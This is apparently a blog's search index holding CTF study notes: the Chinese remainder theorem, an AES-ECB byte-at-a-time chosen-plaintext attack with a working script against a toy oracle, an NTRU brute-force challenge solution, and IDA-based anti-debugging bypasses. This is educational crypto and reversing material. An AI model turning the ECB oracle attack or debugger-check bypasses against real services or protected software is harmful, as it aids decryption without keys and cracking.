<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>中国剩余定理CRT笔记</title>
    <url>//CRT-note.html</url>
    <content><![CDATA[<h1 id="描述">描述</h1>
<p>假设整数 <span class="math inline">\(m_1,m_2,\cdots,m_n\)</span>
两两互素，则对于任意的整数 <span class="math inline">\(a_1,a_2,\cdots,a_n\)</span>，方程组 <span class="math display">\[
\begin{cases}
x\equiv a_1\pmod{m_1}\\
x\equiv a_2\pmod{m_2}\\
\cdots\\
x\equiv a_n\pmod{m_n}
\end{cases}
\]</span> 都存在整数解，且若 <span class="math inline">\(X,Y\)</span>
都满足该方程，则必有 <span class="math inline">\(X\equiv
Y\pmod{M}\)</span>，其中 <span class="math inline">\(M=\displaystyle\prod_{i=1}^nm_i\)</span> 。</p>
<p>具体而言，<span class="math inline">\(x\equiv
\displaystyle\sum_{i=1}^na_i\times\frac{M}{m_i}\times\left[\left(\frac{M}{m_i}\right)^{-1}\right]_{m_i}\pmod{M}\\\)</span></p>
<p>这便是<strong>中国剩余定理(Chinese remainder theorem,
CRT)</strong></p>
<p>求解可以使用以下步骤进行构造：</p>
<ol type="1">
<li><p>设 <span class="math inline">\(M=\displaystyle\prod_{i=1}^nm_i\)</span>，并设
<span class="math inline">\(M_i=\frac{M}{m_i}\)</span>，即除了 <span class="math inline">\(m_i\)</span> 以外 <span class="math inline">\(n-1\)</span> 个数的乘积</p></li>
<li><p>设 <span class="math inline">\(t_i=M_i^{-1}\)</span>，即求 <span class="math inline">\(M_i\)</span> 对 <span class="math inline">\(m_i\)</span> 的模反元素</p></li>
<li><p>那么方程组的通解即为 <span class="math display">\[
x=kM+\sum_{i=1}^na_it_iM_i,k\in\mathrm{Z}
\]</span> 在模 <span class="math inline">\(M\)</span>
的环中，方程组仅有一个唯一整数解 <span class="math display">\[
x=\sum_{i=1}^na_it_iM_i\pmod{M}
\]</span></p></li>
</ol>
<h1 id="实例">实例</h1>
<p>以“物不知数”问题为例，运用中国剩余定理求解。</p>
<p>在该问题中，线性同余方程组为 <span class="math display">\[
\begin{cases}
x\equiv 2\pmod{3}\\
x\equiv 3\pmod{5}\\
x\equiv 2\pmod{7}
\end{cases}
\]</span> 其中模数 <span class="math inline">\(m_1=3,m_2=5,m_3=7\)</span>，得到 <span class="math inline">\(M=105\)</span>，对应的 <span class="math inline">\(M_1=35,M_2=21,M_3=15\)</span>，从而得到逆元 <span class="math inline">\(t_1=2,t_2=1,t_3=1\)</span></p>
<p>故得到基础解 <span class="math display">\[
70=2\times 35\equiv
\begin{cases}
1\pmod{3}\\
0\pmod{5}\\
0\pmod{7}\\
\end{cases},\
21=3\times 7\equiv
\begin{cases}
0\pmod{3}\\
1\pmod{5}\\
0\pmod{7}\\
\end{cases},\
15=3\times 5\equiv
\begin{cases}
0\pmod{3}\\
0\pmod{5}\\
1\pmod{7}\\
\end{cases}\\
\]</span> 将 <span class="math inline">\(a_1,a_2,a_3\)</span>
与基础解对应相乘并求和，得到方程组的解 <span class="math display">\[
233=2\times 70+3\times 21+2\times 15\equiv
\begin{cases}
2\times1+3\times0+2\times0\equiv2\pmod3\\
2\times0+3\times1+2\times0\equiv3\pmod5\\
2\times0+3\times0+2\times1\equiv2\pmod7
\end{cases}
\]</span> 故方程组通解为 <span class="math display">\[
x=233+k\times105,k\in\mathrm{Z}
\]</span> 当 <span class="math inline">\(k=-2\)</span>
时，有最小正整数解 <span class="math inline">\(x=23\)</span></p>
<h1 id="扩展">扩展</h1>
<p>中国剩余定理是适用于 <span class="math inline">\(m_i\)</span>
两两互素的情况的，如果不互素，需要使用合并方程的思想来转换成两两互素后求解。</p>
<p>证明如下</p>
<p>首先仅考虑方程组中的两个方程 <span class="math display">\[
\begin{cases}
x\equiv a_1\pmod{m_1}\\
x\equiv a_2\pmod{m_2}
\end{cases}
\]</span> 那么有 <span class="math display">\[
x=k_1m_1+a_1\\
x=k_2m_2+a_2\tag{*}
\]</span> 即 <span class="math inline">\(k_1m_1+a_1=k_2m_2+a_2\)</span>，变形为 <span class="math inline">\(m_1k_1=(a_2-a_1)+k_2m_2\)</span>，最终得到 <span class="math display">\[
m_1k_1=a_2-a_1\pmod{m_2}
\]</span> 显然，想要有解，必有 <span class="math inline">\(\gcd(m_1,m_2)|(a_2-a_1)\)</span></p>
<p>不妨设 <span class="math inline">\(d=\gcd(m_1,m_2),c=a_2-a_1\)</span>，则有 <span class="math display">\[
\frac{k_1m_1}{d}=\frac{c}{d}\pmod{\frac{m_2}{d}}\\
\Rightarrow
k_1=\frac{c}{d}\times\left(\frac{m_1}{d}\right)^{-1}\pmod{\frac{m_2}{d}}
\]</span> 令 <span class="math inline">\(K=\displaystyle\frac{c}{d}\times\left(\frac{m_1}{d}\right)^{-1}\)</span>，则
<span class="math inline">\(k_1=y\displaystyle\frac{m_2}{d}+K\\\)</span></p>
<p>代入方程 <span class="math inline">\((*)\)</span> 得 <span class="math display">\[
\begin{aligned}
x&amp;=m_1(y\frac{m_2}{d}+K)+a_1\\
&amp;=m_1K+y\frac{m_1m_2}{d}+a_1
\end{aligned}
\]</span> 即 <span class="math display">\[
x=m_1K+a_1\pmod{\frac{m_1m_2}{d}}
\]</span> 即 <span class="math display">\[
x\equiv a\pmod{m},\mathrm{其中}\ a=m_1K+a_11,m=\frac{m_1m_2}{d}
\]</span> 这样，就将方程组合并成为上面这个方程。</p>
<p>最终，合并 <span class="math inline">\(k\)</span> 个方程的最小 <span class="math inline">\(x\)</span> 值为 <span class="math inline">\(a\mod
m\)</span></p>
<p>例如，因为 <span class="math display">\[
84=2^2\times3\times7,160=2^5\times5,63=3^2\times7
\]</span> 我们通过合并可得 <span class="math display">\[
\begin{cases}
x\equiv23\pmod{84}\\
x\equiv7\pmod{160}\\
x\equiv2\pmod{63}
\end{cases}
\ \mathrm{与}\
\begin{cases}
x\equiv7\pmod{2^5}\\
x\equiv2\pmod{3^2}\\
x\equiv7\pmod{5}\\
x\equiv23\pmod{7}
\end{cases}
\ \mathrm{同解}
\]</span></p>
<h1 id="代码">代码</h1>
<p>对于 <span class="math inline">\(m_i\)</span> 互素的情况</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">alist, mlist</span>):</span><br><span class="line">    M = math.prod(mlist)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ai, mi <span class="keyword">in</span> <span class="built_in">zip</span>(alist, mlist):</span><br><span class="line">        Mi = M // mi</span><br><span class="line">        d, _, ti = gmpy2.gcdext(mi, Mi)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>: <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not palistrwise co-prime&quot;</span>)</span><br><span class="line">        x += ai * ti * Mi</span><br><span class="line">    <span class="keyword">return</span> x % M, M</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>AES攻击笔记</title>
    <url>//aes-attack-note.html</url>
    <content><![CDATA[<h1 id="aes-attack">AES Attack</h1>
<h2 id="ecb">ECB</h2>
<h3 id="加密流程">加密流程</h3>
<p>ECB
模式又称电子密码本模式，采用将<strong>明文分组</strong>后直接进行加密成为<strong>密文分组</strong>。</p>
<figure>
<img src="/aes-attack-note/aes-ecb.png" alt="aes-ecb">
<figcaption aria-hidden="true">aes-ecb</figcaption>
</figure>
<p><strong>特点</strong>：ECB
模式中，明文分组与密文分组是<strong>一一对应</strong>的关系。</p>
<h3 id="攻击">攻击</h3>
<h4 id="改变密文顺序">改变密文顺序</h4>
<p>由于明文分组和密文分组是一一对应的关系，如果我们将密文分组的顺序改变，对应的明文分组的顺序也会改变，也就是说攻击者无需
key 即可操纵明文。</p>
<h3 id="尾字节爆破">尾字节爆破</h3>
<p>由于 ECB
模式的特殊性，输入相同的明文可以得到相同的密文，当我们拥有加密机时，我们通过向未知字符串的明文中插入数据，枚举爆破尾字节的信息，本质上是一种选择明文攻击。</p>
<p>假设未知的明文是 <code>XXXXXXXX</code>，构造数据
<code>0000000X XXXXXXX</code>，其中 <code>0000000</code>
为我们已知的明文，放入加密机加密得到密文
<code>01234567 76543210</code>，其中 <code>01234567</code> 为明文块
<code>0000000X</code> 所对应的密文块。</p>
<p>我们爆破该明文块的最后一个字节，直到尝试发现 <code>0000000Q</code>
加密得到的密文块也是
<code>01234567</code>，那么就得到了明文的第一个字节为
<code>Q</code>。</p>
<p>以此类推，我们最终能通过选择明文的方式破解完整的明文。</p>
<p>假设存在加密机</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESECBMachine</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        self.key = key</span><br><span class="line">        self.machine = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, msg: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.machine.encrypt(msg)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, cipher: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.machine.decrypt(cipher)</span><br><span class="line">    </span><br><span class="line">machine = AESECBMachine(<span class="string">b&#x27;0123456789abcefg&#x27;</span>)</span><br><span class="line">MESSAGE = <span class="string">b&quot;Hope you can happy&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">msg: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> machine.encrypt(pad(msg + MESSAGE, <span class="number">16</span>))</span><br></pre></td></tr></table></figure>
<p>其中通过 <code>get</code>
函数可以得到加密机加密的结果，<code>MESSAGE</code>
为我们需要破解的明文。</p>
<p>我们首先可以尝试自己填充明文，得到未知明文长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_length</span>(<span class="params">block_size: <span class="built_in">int</span></span>):</span><br><span class="line">    last_cipher = get(<span class="string">b&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> pad_size <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, block_size):</span><br><span class="line">        cipher = get(<span class="built_in">bytes</span>(pad_size))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(last_cipher) != <span class="built_in">len</span>(cipher):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">len</span>(last_cipher) - pad_size</span><br><span class="line"></span><br><span class="line">block_size = <span class="number">16</span></span><br><span class="line">message_length = test_length(block_size)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;message length:&quot;</span>, message_length)</span><br></pre></td></tr></table></figure>
<p>随后我们进行尾字节爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># 保存已知明文</span></span><br><span class="line">known_message = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="comment"># 明文字符集</span></span><br><span class="line">message_table: <span class="built_in">str</span> = string.printable</span><br><span class="line"><span class="keyword">for</span> block_count <span class="keyword">in</span> <span class="built_in">range</span>(message_length // block_size + <span class="number">1</span>):</span><br><span class="line">    unknown_length = block_size</span><br><span class="line">    <span class="keyword">for</span> times <span class="keyword">in</span> <span class="built_in">range</span>(block_size):</span><br><span class="line">        <span class="comment"># 选择明文</span></span><br><span class="line">        test = <span class="built_in">bytes</span>(unknown_length - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 用于比较的结果</span></span><br><span class="line">        check_result = get(test)[:block_count * block_size + unknown_length]</span><br><span class="line">        <span class="keyword">for</span> test_bytes <span class="keyword">in</span> message_table:</span><br><span class="line">            result = get(test + known_message + test_bytes.encode())[:block_count * block_size + unknown_length]</span><br><span class="line">            <span class="keyword">if</span> result == check_result:</span><br><span class="line">                known_message += test_bytes.encode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Crack Message:&quot;</span>, known_message)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        unknown_length -= <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>aes</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>NTRU密码体制笔记</title>
    <url>//NTRU-note.html</url>
    <content><![CDATA[<h1 id="ntru-原理">NTRU 原理</h1>
<h2 id="简述">简述</h2>
<p>NTRU
是一种基于环与格的公钥密码系统，特点是密钥短且容易产生，算法运算速度快，所需存储空间小。</p>
<h2 id="前提">前提</h2>
<ol type="1">
<li><p>设 <span class="math inline">\(R(N)\)</span> 表示最高次数不超过
<span class="math inline">\(N-1\)</span> 的所有整系数多项式集合，即
<span class="math inline">\(a=a_0+a_1x+\cdots+a_{N-1}x^{N-1}\)</span></p></li>
<li><p><span class="math inline">\(R\)</span> 上的加法定义为：<span class="math inline">\(a+b=(a_0+b_0)+(a_1+b_1)x+\cdots+(a_{N-1}+b_{N-1})x^{N-1}\)</span></p></li>
<li><p><span class="math inline">\(R\)</span> 上的乘法定义为：<span class="math inline">\(a\times
b=c_0+c_1x+\cdots+c_{N-1}x^{N-1}\)</span>，其中第 <span class="math inline">\(k\)</span> 阶系数为： <span class="math display">\[
\sum_{i+j\equiv k\pmod{N}}a_ib_i
\]</span></p></li>
</ol>
<p>由以上定义可知，<span class="math inline">\(R\)</span>
的加法和乘法运算构成一个环。</p>
<h2 id="算法">算法</h2>
<p>首先需要三个整数 <span class="math inline">\(N,p,q\)</span>，其中
<span class="math inline">\(N-1\)</span> 为多项式的阶，<span class="math inline">\(\gcd(p,q)\equiv1\)</span> 且 <span class="math inline">\(q&gt;p\)</span>，且 <span class="math inline">\(L_f,L_g,L_\phi,L_m\)</span> 为 <span class="math inline">\(R(N)\)</span></p>
<h3 id="密钥生成">密钥生成</h3>
<ol type="1">
<li><p>随机选取两个多项式 <span class="math inline">\(f,g\in
L_g\)</span>，其中多项式 <span class="math inline">\(f\)</span> 在模
<span class="math inline">\(p\)</span> 和 模 <span class="math inline">\(q\)</span> 下均可逆，其逆元分别表示为 <span class="math inline">\(F_p,F_q\)</span>，即满足 <span class="math display">\[
F_p\cdot f\equiv1\pmod{p}\\F_q\cdot f\equiv1\pmod{q}
\]</span></p></li>
<li><p>计算 <span class="math inline">\(h\equiv F_q\cdot
g\pmod{q}\)</span></p></li>
<li><p>以 <span class="math inline">\(h\)</span> 作为公钥， <span class="math inline">\(f\)</span> 作为密钥，但密文接收方需要保存 <span class="math inline">\(F_q\)</span></p></li>
</ol>
<h3 id="加密">加密</h3>
<ol type="1">
<li><p>设 <span class="math inline">\(m\)</span> 为消息，有多项式 <span class="math inline">\(\phi\in L_\phi\)</span></p></li>
<li><p>用公钥 <span class="math inline">\(h\)</span>
对消息进行加密（这里有可能并不会与 <span class="math inline">\(p\)</span> 相乘）： <span class="math display">\[
e\equiv p\phi\cdot h+m\pmod{q}
\]</span></p></li>
<li><p><span class="math inline">\(e\)</span> 即为密文</p></li>
</ol>
<h3 id="解密">解密</h3>
<ol type="1">
<li>计算 <span class="math inline">\(a\equiv f\cdot
e\pmod{q}\)</span>，其中 <span class="math inline">\(a\)</span>
的系数选在 <span class="math inline">\(\displaystyle(-\frac{q}{2},\frac{q}{2})\)</span>
区间内</li>
<li>计算 <span class="math inline">\(m=F_P\cdot a\pmod{p}\)</span></li>
</ol>
<h3 id="解密原理">解密原理</h3>
<p><span class="math display">\[
\begin{align*}
a&amp;\equiv f\cdot e\\
&amp;\equiv f\cdot p\phi+f\cdot m\pmod{q}\\
&amp;\equiv f\cdot p\phi \cdot F_qg+f\cdot m\pmod{q}\\
&amp;\equiv p\phi\cdot g+f\cdot m\pmod{q}
\end{align*}
\]</span></p>
<p>其中 <span class="math inline">\(a\)</span> 的系数选在 <span class="math inline">\(\displaystyle(-\frac{q}{2},\frac{q}{2})\)</span>
区间内，故 <span class="math display">\[
m=F_p\cdot a\equiv F_p\cdot p\phi\cdot g+F_p\cdot f\cdot m\pmod{p}\equiv
m\pmod{p}
\]</span></p>
<h1 id="ntru-求解">NTRU 求解</h1>
<h2 id="明文爆破">明文爆破</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># parameters</span></span><br><span class="line">N = <span class="number">10</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">512</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q&gt;(<span class="number">6</span>*d+<span class="number">1</span>)*p</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#d1 1s and #d2 -1s</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">d1, d2</span>):</span><br><span class="line">    <span class="keyword">assert</span> N &gt;= d1+d2</span><br><span class="line">    s = [<span class="number">1</span>]*d1 + [-<span class="number">1</span>]*d2 + [<span class="number">0</span>]*(N-d1-d2)</span><br><span class="line">    shuffle(s)</span><br><span class="line">    <span class="keyword">return</span> R(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invertModPrime</span>(<span class="params">f, p</span>):</span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(lift(<span class="number">1</span> / Rp(f)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f, g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f*g) % (x^N-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">liftMod</span>(<span class="params">f, q</span>):</span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polyMod</span>(<span class="params">f, q</span>):</span><br><span class="line">    g = [f[i]%q <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invertModPow2</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invertModPrime(f,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = liftMod(convolution(g,f),q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g</span><br><span class="line">        g = liftMod(convolution(g,<span class="number">2</span> - r),q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genMessage</span>():</span><br><span class="line">    result = <span class="built_in">list</span>(randrange(p) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> R(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genKey</span>():</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      f = T(d+<span class="number">1</span>, d)</span><br><span class="line">      g = T(d, d)</span><br><span class="line">      Fp = polyMod(invertModPrime(f, p), p)</span><br><span class="line">      Fq = polyMod(invertModPow2(f, q), q)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">  h = polyMod(convolution(Fq, g), q)</span><br><span class="line">  <span class="keyword">return</span> h, (f, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, h</span>):</span><br><span class="line">    e = liftMod(p*convolution(h, T(d, d)) + m, q)</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1</span></span><br><span class="line">h, secret = genKey()</span><br><span class="line">m = genMessage()</span><br><span class="line">e = encrypt(m, h)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h = %s&#x27;</span> % h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e = %s&#x27;</span> % e)</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">list</span>(randrange(p) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(-<span class="number">1</span>, p), repeat=N):</span><br><span class="line">    i = <span class="built_in">list</span>(i)</span><br><span class="line">    m = R(i)</span><br><span class="line">    <span class="keyword">if</span> encrypt(m, h) == e:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2</span></span><br><span class="line">sha3 = SHA3_256.new()</span><br><span class="line">sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">key = sha3.digest()</span><br><span class="line"></span><br><span class="line">cypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">c = cypher.encrypt(pad(flag, <span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %s&#x27;</span> % c)</span><br></pre></td></tr></table></figure>
<p>输出为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">h = <span class="number">39</span>*x^<span class="number">9</span> + <span class="number">60</span>*x^<span class="number">8</span> + <span class="number">349</span>*x^<span class="number">7</span> + <span class="number">268</span>*x^<span class="number">6</span> + <span class="number">144</span>*x^<span class="number">5</span> + <span class="number">469</span>*x^<span class="number">4</span> + <span class="number">449</span>*x^<span class="number">3</span> + <span class="number">165</span>*x^<span class="number">2</span> + <span class="number">248</span>*x + <span class="number">369</span></span><br><span class="line">e = -<span class="number">144</span>*x^<span class="number">9</span> - <span class="number">200</span>*x^<span class="number">8</span> - <span class="number">8</span>*x^<span class="number">7</span> + <span class="number">248</span>*x^<span class="number">6</span> + <span class="number">85</span>*x^<span class="number">5</span> + <span class="number">102</span>*x^<span class="number">4</span> + <span class="number">167</span>*x^<span class="number">3</span> + <span class="number">30</span>*x^<span class="number">2</span> - <span class="number">203</span>*x - <span class="number">78</span></span><br><span class="line">c = <span class="string">b&#x27;\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96=&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br></pre></td></tr></table></figure>
<p>由于明文多项式较小，直接爆破即可：</p>
<p>首先各种多项式 m 的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;m.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(p), repeat=N):</span><br><span class="line">    r = <span class="built_in">list</span>(j-<span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> i)</span><br><span class="line">    m = R(r)</span><br><span class="line">    <span class="built_in">print</span>(m, file=fp)</span><br></pre></td></tr></table></figure>
<p>然后直接爆破即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;m.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().splitlines()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">c = <span class="string">b&#x27;\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96=&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> data:</span><br><span class="line">    sha3 = SHA3_256.new()</span><br><span class="line">    sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    key = sha3.digest()</span><br><span class="line"></span><br><span class="line">    cypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    k = cypher.decrypt(c)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#x27;</span> <span class="keyword">in</span> k:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;k=&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>逆向中反制反调试手段笔记</title>
    <url>//anti-anti-debug-note.html</url>
    <content><![CDATA[<h1 id="isdebuggerpresent-绕过">IsDebuggerPresent 绕过</h1>
<p><code>IsDebuggerPresent</code> 作为 winapi 函数，不可去符号表，在 ida
中可以通过导入表 (imports) 找到函数，然后通过以下几种手段绕过：</p>
<ol type="1">
<li>调试时，修改函数返回值 (即修改 rax 寄存器值)</li>
<li>调试时，修改相应的内存 (内存窗口中查找 <code>fs:[30]</code> 位置，即
<code>PEB</code> 地址，偏移为 0x68 的位置即为 <code>BeingDebugged</code>
)</li>
<li>将调用函数后的条件语句修改 (<code>jz</code> → <code>jnz</code> /
<code>jnz</code> → <code>jz</code>)</li>
<li>将相应代码区段 patch <code>nop</code></li>
<li>动态调试时，直接跳过函数运行</li>
</ol>
<h1 id="peb-标志位绕过">PEB 标志位绕过</h1>
<p>需要通过 ida 查找是否有涉及到 <code>fs</code> 寄存器的汇编代码</p>
<p>然后再进行相应的操作，如 patch <code>nop</code> 等。</p>
<h1 id="自修改代码绕过">自修改代码绕过</h1>
<p>如以下例题</p>
<figure>
<img src="/anti-anti-debug-note/473_af0_6f0.png" alt="ques">
<figcaption aria-hidden="true">ques</figcaption>
</figure>
<h2 id="静态分析">静态分析</h2>
<p>通过 ida 静态分析，找到相应的修改算法，通过 ida python
逆向修改代码区段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">judge=<span class="number">0x600B00</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">182</span>):</span><br><span class="line">    addr=judge+i</span><br><span class="line">    byte=get_byte(addr)</span><br><span class="line">    <span class="comment"># 获取指定地址的指定字节数</span></span><br><span class="line">    byte=<span class="built_in">ord</span>(byte)^<span class="number">0xC</span></span><br><span class="line">    <span class="comment"># 打patch修改字节 </span></span><br><span class="line">    patch_byte(addr, byte)</span><br></pre></td></tr></table></figure>
<p>一个可能的 IDA Python 静态分析脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start = <span class="number">0x402219</span></span><br><span class="line">offset = <span class="number">233</span></span><br><span class="line">xorn = <span class="number">0x99</span></span><br><span class="line">data = get_bytes(start, offset)</span><br><span class="line">newdata = <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x ^ xorn, data))</span><br><span class="line">ida_bytes.patch_bytes(start, newdata)</span><br></pre></td></tr></table></figure>
<h2 id="动态分析">动态分析</h2>
<p>通过 ida 或是 ollydbg
等动态调试器，在解密代码后下断点，可以直接将其自修改后的程序导出，但会存在数据可能发生错误的问题。</p>
<p>最好将对应自修改后的代码与之前的代码进行结合分析。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>anti-debug</tag>
        <tag>c</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>反调试笔记</title>
    <url>//anti-debug-note.html</url>
    <content><![CDATA[<h1 id="反调试技术">反调试技术</h1>
